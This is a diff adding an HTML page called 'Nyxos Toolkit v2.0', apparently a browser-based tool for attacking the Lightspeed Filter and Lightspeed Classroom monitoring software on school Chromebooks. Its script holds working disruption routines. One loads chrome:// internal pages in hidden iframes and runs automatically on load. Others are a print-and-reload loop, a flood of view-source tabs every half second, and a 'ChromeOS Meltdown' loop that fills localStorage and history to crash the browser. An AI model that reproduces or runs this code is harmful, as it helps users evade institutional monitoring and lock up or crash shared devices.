@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nyxos Toolkit v2.0</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0e17;
+            --panel: #151a28;
+            --accent: #00f0ff;
+            --danger: #ff3a5e;
+            --nuke: #ff2a00;
+            --text: #e0f4ff;
+            --text-dim: #8a9bb8;
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'JetBrains Mono', monospace;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+        .cyber-container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        .cyber-header {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.2rem;
+            margin-bottom: 1.5rem;
+            color: var(--accent);
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.3);
+            border-bottom: 1px solid rgba(0, 240, 255, 0.2);
+            padding-bottom: 0.5rem;
+        }
+        .cyber-panel {
+            background: var(--panel);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+        .cyber-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--accent);
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+        }
+        .cyber-select {
+            width: 100%;
+            padding: 0.8rem;
+            background: rgba(0, 20, 40, 0.5);
+            border: 1px solid rgba(0, 200, 255, 0.3);
+            color: var(--text);
+            border-radius: 6px;
+            margin-bottom: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .cyber-btn {
+            padding: 0.8rem 1.2rem;
+            border: none;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .cyber-btn-primary {
+            background: linear-gradient(135deg, #0077ff, #00c8ff);
+            color: white;
+        }
+        .cyber-btn-danger {
+            background: linear-gradient(135deg, #ff1a4a, #ff3a5e);
+            color: white;
+        }
+        .cyber-btn-nuke {
+            background: linear-gradient(135deg, #ff1a00, #ff2a00);
+            color: white;
+            animation: pulse 1.5s infinite;
+        }
+        .cyber-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 200, 255, 0.3);
+        }
+        .cyber-status {
+            position: fixed;
+            bottom: 1rem;
+            right: 1rem;
+            background: rgba(10, 20, 40, 0.8);
+            padding: 0.8rem 1.5rem;
+            border-radius: 6px;
+            border: 1px solid rgba(0, 200, 255, 0.2);
+            font-size: 0.9rem;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="cyber-container">
+        <h1 class="cyber-header">Nyxos Toolkit v2.0</h1>
+        
+        <div class="cyber-panel">
+            <h2 class="cyber-title">Exploit Engine</h2>
+            <select class="cyber-select" id="targetSelect">
+                <option value="filter">Lightspeed Filter</option>
+                <option value="classroom">Lightspeed Classroom</option>
+                <option value="all">ALL TARGETS</option>
+            </select>
+            <div>
+                <button class="cyber-btn cyber-btn-primary" onclick="blockChromePages()">Block Chrome Pages</button>
+                <button class="cyber-btn cyber-btn-primary" onclick="printReloadSpam()">Print & Reload Spam</button>
+                <button class="cyber-btn cyber-btn-danger" onclick="sourceFlood()">Source Flood</button>
+                <button class="cyber-btn cyber-btn-nuke" onclick="chromeMeltdown()">ChromeOS Meltdown</button>
+            </div>
+        </div>
+
+        <div class="cyber-panel">
+            <h2 class="cyber-title">System Control</h2>
+            <button class="cyber-btn cyber-btn-danger" onclick="emergencyStop()">EMERGENCY STOP</button>
+        </div>
+
+        <div class="cyber-status">
+            <span id="statusText">STATUS: READY</span>
+        </div>
+    </div>
+
+    <script>
+        const CHROME_PAGES = [
+            'chrome://print',
+            'chrome://user-education-internals/',
+            'chrome://webui-gallery/a11y'
+        ];
+        let activeAttack = null;
+        let blockedPages = [];
+
+        function updateStatus(text) {
+            document.getElementById('statusText').textContent = `STATUS: ${text}`;
+        }
+
+        function blockChromePages() {
+            CHROME_PAGES.forEach(page => {
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = page;
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    blockedPages.push(iframe);
+                } catch (e) {
+                    console.error(`Failed to block ${page}:`, e);
+                }
+            });
+            updateStatus("CHROME PAGES BLOCKED");
+        }
+
+        function printReloadSpam() {
+            window.print();
+            activeAttack = setInterval(() => {
+                location.reload();
+                window.print();
+            }, 5000);
+            updateStatus("PRINT/RELOAD SPAMMING");
+        }
+
+        function sourceFlood() {
+            activeAttack = setInterval(() => {
+                window.open('view-source:' + window.location.href, '_blank');
+            }, 500);
+            updateStatus("SOURCE FLOOD ACTIVE");
+        }
+
+        function chromeMeltdown() {
+            activeAttack = setInterval(() => {
+                try {
+                    localStorage.setItem('crash', Array(1e6).join('X'));
+                    history.pushState({}, '', `?${Math.random()}`);
+                } catch (e) {}
+            }, 100);
+            updateStatus("MELTDOWN ACTIVE");
+        }
+
+        function emergencyStop() {
+            if (activeAttack) clearInterval(activeAttack);
+            blockedPages.forEach(iframe => iframe.remove());
+            blockedPages = [];
+            updateStatus("STOPPED");
+        }
+
+        // Auto-block on load
+        blockChromePages();
+    </script>
+</body>
+</html>
